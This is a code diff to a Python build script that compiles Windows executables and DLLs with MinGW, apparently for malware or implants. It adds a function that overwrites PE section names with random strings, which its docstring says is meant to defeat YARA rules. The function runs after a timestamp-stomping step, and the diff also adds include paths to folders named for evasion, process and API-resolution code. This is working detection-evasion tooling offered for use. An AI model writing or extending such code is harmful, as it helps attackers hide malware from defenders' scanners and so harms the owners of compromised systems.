@@ -333,6 +333,41 @@ def stomp_pe_timestamp(exe_path: str) -> None:
         pass
 
 
+def randomize_section_names(exe_path: str) -> None:
+    """Rename PE section names to random strings. Defeats YARA rules matching on .text/.data/.rdata."""
+    import struct
+    import random
+    import string
+    try:
+        with open(exe_path, "r+b") as f:
+            if f.read(2) != b"MZ":
+                return
+            f.seek(0x3C)
+            pe_off = struct.unpack("<I", f.read(4))[0]
+            f.seek(pe_off)
+            if f.read(4) != b"PE\x00\x00":
+                return
+            # COFF header: Machine(2), NumberOfSections(2), ...
+            f.seek(pe_off + 6)
+            num_sections = struct.unpack("<H", f.read(2))[0]
+            f.seek(pe_off + 20)
+            opt_hdr_size = struct.unpack("<H", f.read(2))[0]
+            section_table_off = pe_off + 24 + opt_hdr_size
+            chars = string.ascii_letters + string.digits
+            for i in range(num_sections):
+                sec_off = section_table_off + i * 40
+                f.seek(sec_off)
+                old_name = f.read(8)
+                # Generate random 4-6 char name with . prefix
+                name_len = random.randint(3, 6)
+                new_name = "." + "".join(random.choice(chars) for _ in range(name_len))
+                new_name_bytes = new_name.encode("ascii").ljust(8, b"\x00")
+                f.seek(sec_off)
+                f.write(new_name_bytes)
+    except (OSError, struct.error):
+        pass
+
+
 def compile_mingw(source_path: str, output_path: str, dll_def: str | None = None) -> bool:
     is_dll = dll_def is not None
     if is_dll and not output_path.endswith(".dll"):
@@ -340,6 +375,10 @@ def compile_mingw(source_path: str, output_path: str, dll_def: str | None = None
     cmd = [
         "x86_64-w64-mingw32-gcc",
         "-mwindows",
+        f"-I{CHUNKS_DIR / 'process'}",
+        f"-I{CHUNKS_DIR / 'evasion'}",
+        f"-I{CHUNKS_DIR / 'api_resolve'}",
+        f"-I{CHUNKS_DIR}",
     ]
     if is_dll:
         cmd.append("-shared")
@@ -349,7 +388,7 @@ def compile_mingw(source_path: str, output_path: str, dll_def: str | None = None
     cmd.extend([
         "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32", "-lshell32", "-lgdi32",
         "-lwininet", "-lwinhttp", "-ldnsapi", "-ladvapi32", "-luser32",
-        "-lwldap32", "-lnetapi32",
+        "-lwldap32", "-lnetapi32", "-lmpr",
         "-static", "-s", "-Wl,--strip-all",
     ])
     if is_dll:
@@ -360,6 +399,7 @@ def compile_mingw(source_path: str, output_path: str, dll_def: str | None = None
             print(f"Compile error:\n{result.stderr}", file=sys.stderr)
             return False
         stomp_pe_timestamp(output_path)
+        randomize_section_names(output_path)
         size = os.path.getsize(output_path)
         print(f"Compiled: {output_path} ({size} bytes)")
         return True
